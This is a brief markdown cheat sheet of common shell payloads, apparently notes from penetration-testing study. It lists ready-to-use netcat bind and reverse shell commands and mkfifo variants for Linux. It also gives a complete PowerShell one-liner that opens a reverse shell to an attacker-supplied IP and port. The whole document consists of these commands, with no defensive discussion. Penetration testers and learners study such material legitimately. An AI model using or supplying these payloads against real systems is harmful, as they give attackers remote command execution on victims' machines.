# Common Shell Payloads

- Allows you to execute a process on conncetion:

`-e`
`nc -nvlp <PORT> -e /bin/bash`

Connecting to this listener would result in a __bind shell__

`nc <LOCAL_IP> <PORT> -e /bin/bash`

Connecting to this would result in a reverse shell

This technique will work on Windows.

On Linux for bind shell:

`mkfifo /tmp/f; nc -nvlp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Reverse shell:

`mkfifo /tmp/f; nc <LOCAL_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Windows Server Powershell reverse shell:

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

